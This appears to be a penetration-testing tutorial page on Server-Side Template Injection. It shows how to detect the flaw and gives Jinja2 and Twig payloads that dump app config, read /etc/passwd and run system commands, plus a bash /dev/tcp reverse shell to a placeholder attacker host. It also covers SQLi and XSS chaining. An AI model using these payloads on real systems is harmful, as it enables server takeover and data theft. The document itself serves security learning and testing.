# 👀 SSTI

Server-Side Template Injection (SSTI) is a critical vulnerability where an attacker can inject template code into a web application’s template engine, causing it to be executed server-side. This can lead to severe security issues, including **information disclosure**, **remote code execution (RCE)**, and **local file inclusion (LFI)**.

***

### **1. Context and Overview**

#### What Is SSTI?

A **template engine** is responsible for rendering dynamic content by merging templates (pre-defined HTML) with user input or data from a database. Common examples include **Jinja2** for Python (used in Flask/Django), **Twig** for PHP, and **Velocity** for Java-based applications. These engines allow dynamic content to be generated based on user inputs or system data.

**SSTI** occurs when the application **fails to sanitize** user input properly, allowing an attacker to inject malicious template syntax. This can result in various attacks, such as reading sensitive files, executing arbitrary code, or even compromising the entire server.

***

### **2. Identifying SSTI Vulnerabilities**

Identifying SSTI vulnerabilities is similar to detecting **SQL injection** or **Cross-Site Scripting (XSS)**. The goal is to inject special characters or expressions that the template engine will try to evaluate.

#### **Common Injection Syntax for Template Engines:**

* **Jinja2 (Python)**: `{{ ... }}`
* **Twig (PHP)**: `{{ ... }}`
* **Velocity (Java)**: `${ ... }`

<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p><a href="https://portswigger.net/web-security/server-side-template-injection"><strong>https://portswigger.net/web-security/server-side-template-injection</strong></a></p></figcaption></figure>

#### **Testing for SSTI:**

Look for places where user input is incorporated into templates. The most common input fields to test include:

* **Form Inputs** (e.g., search bars, login forms)
* **URL Parameters** (e.g., `?name={{ user_name }}`)
* **HTTP Headers** (e.g., custom headers, cookies)
* **File Uploads** (e.g., image metadata or document-based templates)

#### **Burp Suite Example:**

Let’s start with an example using **Burp Suite** to intercept and manipulate HTTP requests.

**Request:**

Imagine we’re testing a login form that takes a `username` parameter and outputs a personalized greeting:

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

username=vautia&password=testpassword
```

**Injection:**

Inject the following SSTI payload in the `username` parameter to test for template processing:

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

username={{7*7}}&password=testpassword
```

**Response:**

After sending the request, the server responds with the following:

```html
Hello 49! Welcome to the site.
```

This reveals that the application is processing the input as a template expression, indicating an **SSTI vulnerability**.

***

### **3. Exploiting SSTI: Common Scenarios**

Once SSTI is identified, attackers can leverage various techniques to exploit the vulnerability.

#### **Scenario 1: Information Disclosure**

An attacker can use SSTI to expose internal application configurations or secrets, such as database credentials, environment variables, or API keys.

**Example Payload (Jinja2):**

```plaintext
{{ config.items() }}
```

**Response:**

```plaintext
[('DEBUG', True), ('SECRET_KEY', 'randomkey1234'), ('SQLALCHEMY_DATABASE_URI', 'mysql://user:password@localhost/db')]
```

This reveals sensitive configuration data.

***

#### **Scenario 2: Local File Inclusion (LFI)**

SSTI can be leveraged to read sensitive files, such as `/etc/passwd` on Linux systems or application logs, if the template engine has access to the filesystem.

**Example Payload (Jinja2):**

```plaintext
{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}
```

**Response:**

```plaintext
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

This exposes the contents of `/etc/passwd`, potentially revealing user accounts and system information.

**Example Payload (Twig):**

```plaintext
{{ "/etc/passwd"|file_excerpt(1,-1) }}
```

**Response:**

```plaintext
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

***

#### **Scenario 3: Remote Code Execution (RCE)**

The most severe impact of SSTI is remote code execution. This allows attackers to run arbitrary commands on the server, potentially compromising the entire system.

**Example Payload (Jinja2):**

Executing the `id` command to get the user context:

```plaintext
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

**Response:**

```plaintext
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirms that the attacker can execute commands on the server.

**Example Payload (Twig):**

In **Twig**, you can use the `filter('system')` function to execute arbitrary system commands:

```plaintext
{{ ['id'] | filter('system') }}
```

**Response:**

```plaintext
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Advanced Remote Code Execution (RCE):**

Attackers can escalate RCE to more dangerous payloads, such as reverse shells or data exfiltration.

**Reverse Shell Example (Jinja2):**

```plaintext
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -i >& /dev/tcp/attacker_ip/4444 0>&1').read() }}
```

This command attempts to open a reverse shell back to the attacker's machine at IP `attacker_ip` on port `4444`.

***

### **4. Advanced Payloads and Complex Exploitation**

#### **Chaining SSTI with Other Vulnerabilities**

In some cases, SSTI can be chained with other vulnerabilities, like **SQL Injection (SQLi)** or **Command Injection**, to achieve greater control over the application.

**SSTI + SQL Injection (SQLi):**

Imagine an application that uses template injection to build SQL queries. If the application is also vulnerable to **SQL injection**, an attacker can combine both vulnerabilities to extract sensitive data.

```plaintext
{{ config['SECRET_KEY'] }}' OR 1=1 --
```

This could reveal the secret key while bypassing login authentication by exploiting the SQLi part.

**SSTI + XSS:**

An attacker can inject **Cross-Site Scripting (XSS)** payloads into the template, which can then be executed in other users' browsers.

```plaintext
{{ "<script>alert('XSS')</script>" }}
```

This injects malicious JavaScript into the page, which gets executed when another user visits the site.
